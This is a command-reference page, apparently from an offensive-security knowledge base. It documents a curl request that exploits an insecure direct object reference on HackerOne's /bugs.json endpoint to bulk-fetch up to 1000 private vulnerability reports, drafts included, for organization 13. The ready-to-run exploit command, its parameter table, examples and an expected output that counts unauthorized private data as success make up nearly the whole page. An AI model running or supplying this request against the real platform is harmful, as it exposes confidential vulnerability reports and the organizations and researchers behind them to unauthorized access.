---
id: cmd-idor-bulk-fetch-hackerone
data: >-
  curl -X POST 'https://hackerone.com/bugs.json' -H 'Cookie: Your-Cookies' -H
  'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101
  Firefox/115.0' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H
  'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H
  'Referer: https://hackerone.com/bugs?subject=user' -H 'X-Csrf-Token:
  Csrf-Token' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type:
  application/x-www-form-urlencoded' --data-urlencode 'text_query='
  --data-urlencode 'organization_id=13' --data-urlencode 'view=open'
  --data-urlencode 'substates[]=new' --data-urlencode
  'substates[]=needs-more-info' --data-urlencode
  'substates[]=pending-program-review' --data-urlencode 'substates[]=triaged'
  --data-urlencode 'substates[]=pre-submission' --data-urlencode
  'substates[]=retesting' --data-urlencode 'substates[]=not-applicable'
  --data-urlencode 'substates[]=editing' --data-urlencode
  'substates[]=informative' --data-urlencode 'program_states[]=2'
  --data-urlencode 'program_states[]=3' --data-urlencode 'program_states[]=4'
  --data-urlencode 'program_states[]=5' --data-urlencode
  'sort_type=latest_activity' --data-urlencode 'sort_direction=descending'
  --data-urlencode 'limit=1000' --data-urlencode 'page=1'
tags:
  - idor
  - http-post
  - bulk
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:48.238Z'
verified: false
validated: true
submitted: true
---
# hackerone-idor-bulk-fetch-reports

## Command

```bash
curl -X POST 'https://hackerone.com/bugs.json' \
  -H 'Cookie: Your-Cookies' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: https://hackerone.com/bugs?subject=user' \
  -H 'X-Csrf-Token: Csrf-Token' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'text_query=' \
  --data-urlencode 'organization_id=13' \
  --data-urlencode 'view=open' \
  --data-urlencode 'substates[]=new' \
  --data-urlencode 'substates[]=needs-more-info' \
  --data-urlencode 'substates[]=pending-program-review' \
  --data-urlencode 'substates[]=triaged' \
  --data-urlencode 'substates[]=pre-submission' \
  --data-urlencode 'substates[]=retesting' \
  --data-urlencode 'substates[]=not-applicable' \
  --data-urlencode 'substates[]=editing' \
  --data-urlencode 'substates[]=informative' \
  --data-urlencode 'program_states[]=2' \
  --data-urlencode 'program_states[]=3' \
  --data-urlencode 'program_states[]=4' \
  --data-urlencode 'program_states[]=5' \
  --data-urlencode 'sort_type=latest_activity' \
  --data-urlencode 'sort_direction=descending' \
  --data-urlencode 'limit=1000' \
  --data-urlencode 'page=1'
```

## Description

This curl command performs a bulk IDOR fetch from HackerOne's /bugs.json, targeting organization 13 with no text query, high limit, and multiple state filters to retrieve up to 1000 private reports including drafts. Use for demonstrating large-scale data exposure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `text_query` | Empty for broad fetch | Yes (empty) |
| `organization_id` | Target org (e.g., 13) | Yes |
| `view` | open for open reports | No |
| `substates[]` | Filters like new, editing | No |
| `program_states[]` | Program states 2-5 | No |
| `limit` | Max results (1000) | No |
| `page` | Pagination page (1) | No |
| `sort_type` | latest_activity | No |
| `sort_direction` | descending | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://hackerone.com/bugs.json' --data-urlencode 'organization_id=13' --data-urlencode 'limit=1000' [headers]
```

### Advanced Usage

Include all filters as in the main command for comprehensive retrieval.

## Expected Output

Large JSON: {"reports": [array of 1000+ objects with titles, states, drafts]} – success if unauthorized private data is included.

## Related

- [[Related Procedure|procedures/Bulk-Fetch-Private-Reports-with-Pagination-via-IDOR]]
